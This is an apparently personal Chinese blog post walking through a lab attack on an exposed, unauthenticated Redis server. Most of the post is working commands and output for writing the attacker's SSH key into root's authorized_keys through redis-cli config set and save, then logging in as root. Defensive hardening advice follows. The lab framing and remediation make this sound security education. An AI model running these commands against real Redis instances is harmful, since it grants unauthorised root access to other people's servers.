<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Redis漏洞攻击 · Zablog</title><meta name="description" content="Redis漏洞攻击 - Zachary Marv"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://zablog.me/atom.xml" title="Zablog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/Aggerfrank" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/pkumza" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Redis漏洞攻击</h1><div class="post-info">2018年4月6日</div><div class="post-content"><p>在公网暴露端口的无防护Redis实例，很容易成为攻击者直接攻破的跳板，下面讲述一下攻击过程。<br><a id="more"></a><br>在阿里云上分别申请两台服务器，分别是<br>肉鸡： <code>172.17.171.122</code><br>攻击者：<code>172.17.171.123</code></p>
<h2 id="配置无防护的肉鸡"><a href="#配置无防护的肉鸡" class="headerlink" title="配置无防护的肉鸡"></a>配置无防护的肉鸡</h2><p>登陆<code>172.17.171.122</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@Target:~# wget http://download.redis.io/releases/redis-4.0.9.tar.gz</div><div class="line">root@Target:~# tar xzf redis-4.0.9.tar.gz</div><div class="line">root@Target:~# cd redis-4.0.9</div><div class="line">root@Target:~# make</div><div class="line">root@Target:~# vim redis.conf</div></pre></td></tr></table></figure>
<p>编辑redis.conf，把 bind 127.0.0.1 注释掉，以开放端口到外部端口， 并把<code>protected-mode yes</code>改为<code>protected-mode no</code>，使得外界不用密码也能够访问到此redis实例。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">src/redis-server redis.conf</div></pre></td></tr></table></figure>
<h2 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a>实施攻击</h2><p>登陆<code>172.17.171.123</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">root@Atacker:~# apt-get update</div><div class="line">root@Atacker:~# apt-get install redis-tools</div><div class="line">root@Atacker:~# ssh-keygen # 需相应的全默认回车</div><div class="line">root@Atacker:~# (echo -e &quot;\n&quot;;cat .ssh/id_rsa.pub;echo -e &quot;\n&quot;) &gt; pubkey.txt</div><div class="line">root@Atacker:~# cat pubkey.txt | redis-cli -h 172.17.171.122 -x set &quot;pubkey&quot;</div><div class="line">root@Atacker:~# redis-cli -h 172.17.171.122</div><div class="line">172.17.171.122:6379&gt; config set dir /root/.ssh</div><div class="line">172.17.171.122:6379&gt; config set dbfilename &quot;authorized_keys&quot;</div><div class="line">172.17.171.122:6379&gt; save</div><div class="line">172.17.171.122:6379&gt; exit</div><div class="line">root@Atacker:~# ssh root@172.17.171.122</div><div class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-105-generic x86_64)</div><div class="line"></div><div class="line"> * Documentation:  https://help.ubuntu.com</div><div class="line"> * Management:     https://landscape.canonical.com</div><div class="line"> * Support:        https://ubuntu.com/advantage</div><div class="line"></div><div class="line">Welcome to Alibaba Cloud Elastic Compute Service !</div><div class="line"></div><div class="line">Last login: Fri Apr  6 15:33:41 2018 from 172.17.171.123</div><div class="line">root@Target:~#</div></pre></td></tr></table></figure>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@Target:~# cat .ssh/authorized_keys</div><div class="line">REDIS0008�	redis-ver4.0.9�</div><div class="line">redis-bits�@�ctime�H#�Zused-mem��</div><div class="line">                                 �</div><div class="line">                                  aof-preamble���pubkeyA�</div><div class="line"></div><div class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xaxGi7ZQAMX7YJRiyBDdz1RGIaPiSl+LHk8AfIvBjFja3GTRy+YqYk/DrpG/AKpNW27nW4jxckkFuCxpmkXNCkl80EQfI4r1PqhW2qoTpYwX5EJlRP6W5oytS5qqMnNN9mGP3u3/VT7lakk57NjFusdAV00sxMWz/kvgi3ZBxMhtWizLDR04dY3+2uLPwu/0GK10iw1dBoRCig2AAFAwMUwUrxAfb7D0YkqD2tDYz0N3u9TzzXGXHrZEi/nFaBRIqKZEr5RT5gSQLV5BGQud5DsuMw04bt4rr1cvWSLUbFySyvtZh4EVZsYjsAV0rd+SNQ0vbel0ThbpWbALyFXd root@Atacker</div><div class="line"></div><div class="line"></div><div class="line">a�	��x&quot;����r</div></pre></td></tr></table></figure>
<p>攻击者利用redis，把自己的公钥写到了.ssh/authroized_keys文件内，再使用ssh登陆的时候，便被认为是有权限的登陆者，从而获得了root账户的完全控制权。</p>
<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>要禁止这些漏洞，要做以下检查</p>
<ol>
<li>不要使用root用户直接建立实例，可以为redis专门设置一个账户，或者用其他无sudo权限的用户开启redis-server，这样即使被攻破，影响也会小一些。</li>
<li>没有特殊需求的话，防火墙不要轻易暴露公网端口，实例不要轻易绑定0.0.0.0，不要轻易使用默认6379端口，不要轻易把protected-mode设为no。</li>
<li>如果连内网安全都无法保证，请设置密码。这是不推荐的策略，因为能够用防火墙防住的，尽量不要用密码防，毕竟密码有理论上的可破解性。</li>
<li>用户的.ssh内的文件都应该权限设置为400，防止被别的用户篡改。</li>
</ol>
<hr>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ol>
<li>以上实例、IP、公钥都是临时申请的，不会再使用，业已删除，请不要乱试。</li>
<li>实例都是基于纯净版debian 9.2 64bit，测试以上内容不需要额外做任何操作。</li>
</ol>
</div></article></div></main><footer><div class="paginator"><a href="/2018/09/10/scale-cube/" class="prev">PREV</a><a href="/2018/03/09/diskutil/" class="next">NEXT</a></div><div id="disqus_thread"></div><script>var disqus_shortname = 'maziang';
var disqus_identifier = '2018/04/06/redis-hole/';
var disqus_title = 'Redis漏洞攻击';
var disqus_url = 'https://zablog.me/2018/04/06/redis-hole/';
(function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();</script><script id="dsq-count-scr" src="//maziang.disqus.com/count.js" async></script><div class="copyright"><p>© 2014 - 2021 <a href="https://zablog.me">Zachary Marv</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-71255155-1",'auto');ga('send','pageview');</script></body></html>